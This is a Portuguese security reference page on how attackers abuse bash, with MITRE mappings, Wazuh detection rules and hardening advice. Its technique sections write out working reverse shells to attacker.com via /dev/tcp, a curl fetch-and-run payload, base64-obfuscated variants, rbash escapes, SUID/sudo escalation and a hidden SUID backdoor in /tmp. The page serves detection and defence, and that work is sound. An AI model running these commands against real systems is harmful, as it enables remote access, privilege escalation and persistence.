# bash

**Plataforma:** Linux / macOS / Unix

**Categorias:** Shell, Execução de código, Shell reverso, Bypass de ambiente restrito

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID), T1106 (Native API)

**Referência ofensiva:** https://gtfobins.org/gtfobins/bash/

---

## O que é o bash

O bash (Bourne Again Shell) é o interpretador de comandos padrão da maioria das distribuições Linux. É o shell interativo padrão para usuários em sistemas como Ubuntu, Debian, CentOS e Red Hat, e é usado em milhões de scripts de automação, pipelines de CI/CD e configurações de sistema.

Sua presença é quase garantida em qualquer sistema Linux. Diferente de ferramentas como curl ou wget, o bash não precisa fazer download de nada — ele já é o ambiente de execução. Isso o coloca em uma categoria especial: não é apenas uma ferramenta abusável, é a plataforma sobre a qual os demais ataques são executados.

---

## Por que atacantes usam o bash

O bash é abusado principalmente em dois cenários distintos: escape de ambientes restritos (como rbash ou ambientes de container sem shell completo) e estabelecimento de shells reversos usando recursos nativos do próprio bash, sem depender de ferramentas externas como netcat ou socat.

O recurso `/dev/tcp` do bash merece atenção especial. Trata-se de um pseudo-dispositivo emulado pelo próprio interpretador que permite criar conexões TCP diretamente, sem passar por nenhum binário externo. Isso significa que é possível estabelecer um shell reverso completamente funcional usando apenas o bash — nenhuma outra ferramenta precisa estar disponível.

---

## Técnicas de abuso

### Shell reverso via /dev/tcp

Este é o método de shell reverso mais documentado em Linux. O bash abre uma conexão TCP para o servidor do atacante e redireciona stdin, stdout e stderr para esse socket, criando um shell interativo remoto.

```bash
# Forma clássica — bash nativo, sem dependências externas
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Variação com subshell (útil quando o shell atual tem restrições)
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Usando IP numérico para evitar resolução DNS nos logs
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Via /dev/udp (menos comum, mas funciona)
bash -i >& /dev/udp/attacker.com/4444 0>&1

# Em background (não bloqueia o processo pai)
(bash -i >& /dev/tcp/attacker.com/4444 0>&1) &
```

O atacante precisa apenas de um listener na porta escolhida:

```bash
# No servidor do atacante
nc -lvnp 4444
```

### Escape de rbash (Restricted Bash)

O rbash é uma versão restrita do bash usada em ambientes onde se quer limitar o que o usuário pode executar. Restringe redirecionamentos, mudanças de PATH e execução de binários com barra. Vários métodos contornam essas restrições.

```bash
# Escape via invocação de novo bash como argumento de comando permitido
vi --cmd ':!/bin/bash'

# Se o editor de texto está disponível no rbash
echo os.system('/bin/bash') | python3

# Via variável de ambiente (se o rbash não sanitiza BASH_CMDS)
BASH_CMDS[a]=/bin/sh; a

# Escape via ssh local (se ssh está disponível)
ssh localhost -t bash --noprofile

# Se awk está disponível
awk 'BEGIN {system("/bin/bash")}'
```

### Execução com SUID

Se o binário bash tiver o bit SUID ativado (o que pode acontecer por erro de configuração ou como técnica de persistência), ele executa com as permissões do dono do arquivo, geralmente root.

```bash
# Verificar se bash tem SUID
ls -la /bin/bash

# Executar bash preservando privilégios efetivos (flag -p obrigatória)
/bin/bash -p

# Sem a flag -p, o bash descarta os privilégios elevados por segurança
# A flag -p desabilita esse comportamento
```

### Execução via sudo

Se um usuário pode executar bash via sudo (o que é má prática mas ocorre), a escalada é trivial.

```bash
# Se o sudoers contém: user ALL=(ALL) NOPASSWD: /bin/bash
sudo bash

# Ou via sudo su
sudo su -
```

### Execução de comandos sem criar arquivo em disco

O bash pode executar comandos recebidos de variáveis de ambiente, stdin ou heredoc, permitindo execução de código sem criar arquivos.

```bash
# Executar código de variável de ambiente
export CMD='id; whoami; cat /etc/passwd'
bash -c "$CMD"

# Executar código recebido via pipe (sem tocar o disco)
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | bash

# Via process substitution
bash <(curl -s http://attacker.com/payload.sh)
```

---

## Técnicas de bypass e evasão

### Ofuscação do comando de shell reverso

A string `bash -i >& /dev/tcp/` é amplamente conhecida e monitorada. Atacantes usam diversas técnicas para ofuscá-la.

```bash
# Codificação base64
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx' | base64 -d | bash

# Via variáveis fragmentadas
a="ba"; b="sh -i"; c=" >&"; d=" /dev/tc"; e="p/attacker.com/4444 0>&1"
$a$b$c$d$e

# Usando $'\x' notation
$'\x62\x61\x73\x68' -i >& /dev/tcp/attacker.com/4444 0>&1

# Via here-string com eval
eval "$(echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx' | base64 -d)"
```

### Persistência via SUID em bash copiado

Uma técnica de backdoor comum é copiar o bash para um local oculto e definir SUID nessa cópia.

```bash
# (Requer root para configurar, depois qualquer usuário pode usar)
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash

# Uso posterior para obter shell root
/tmp/.bash -p
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- Presença de `/dev/tcp/` ou `/dev/udp/` em argumentos de linha de comando do bash
- bash com flag `-i` (interativo) sendo iniciado por processo não-terminal (daemon, servidor web)
- bash com `>&` e `/dev/tcp` nos argumentos — essa combinação quase nunca é legítima fora de testes
- bash com SUID ativo em localização fora de `/bin/bash` padrão
- bash iniciado como filho de servidor web (apache2, nginx, php-fpm, java)

**Indicadores de média relevância:**

- Uso de `base64 -d | bash` ou `base64 -d | sh` — padrão de execução ofuscada
- bash com argumento `-p` em binário com SUID fora do padrão do sistema
- Novos arquivos com SUID em diretórios não-sistema (/tmp, /dev/shm, /home)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<group name="lolbins,gtfobins,linux,execution">

  <!-- bash com /dev/tcp ou /dev/udp na linha de comando — shell reverso -->
  <rule id="100209" level="15">
    <if_group>auditd</if_group>
    <field name="audit.command">bash</field>
    <field name="audit.execve" type="pcre2">/dev/(tcp|udp)/</field>
    <description>bash com /dev/tcp ou /dev/udp detectado — shell reverso em andamento</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- bash interativo iniciado por processo de servidor web -->
  <rule id="100210" level="14">
    <if_group>auditd</if_group>
    <field name="audit.command">bash</field>
    <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
    <field name="audit.execve" type="pcre2">-i</field>
    <description>bash interativo iniciado por conta de servico web — possivel RCE</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- padrão base64 decode pipe bash — execução ofuscada -->
  <rule id="100211" level="12">
    <if_group>auditd</if_group>
    <field name="audit.command">bash</field>
    <field name="audit.execve" type="pcre2">base64.*\|.*bash|base64.*\|.*sh</field>
    <description>padrao base64 decode pipe bash — possivel execucao de payload ofuscado</description>
    <mitre>
      <id>T1059.004</id>
      <id>T1027</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de provisionamento** — scripts de cloud-init e Ansible frequentemente usam `bash -c` e pipes. Filtre pelo contexto de execução (boot time, usuário root em sessão de provisionamento).

**Ferramentas de desenvolvimento** — IDEs e ferramentas como Make, npm e cargo invocam bash frequentemente. Filtre pelo diretório de trabalho (dentro de repositórios de código) e pelo usuário.

**Testes de conectividade legítimos** — times de infraestrutura às vezes usam `/dev/tcp` para testes de porta sem instalar telnet. Esse uso é raro e deve ser documentado como exceção explícita, não ignorado globalmente.

---

## Proteção e controles defensivos

**Não configurar bash com SUID:** monitore regularmente binários com SUID em todo o sistema. Uma varredura periódica via Wazuh FIM ou auditd com alerta em `chmod +s` é suficiente para detectar essa técnica de persistência.

**Restrições de AppArmor/SELinux para servidores web:** um perfil AppArmor para apache2, nginx ou php-fpm que não permita execução de bash elimina o vetor mais crítico — shell vindo de aplicação web comprometida.

**Monitoramento de /dev/shm e /tmp:** esses diretórios são frequentemente usados para staging. Configure o Wazuh FIM para alertar sobre executáveis criados nessas localizações.

---

## Referências

- GTFOBins — bash: https://gtfobins.org/gtfobins/bash/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
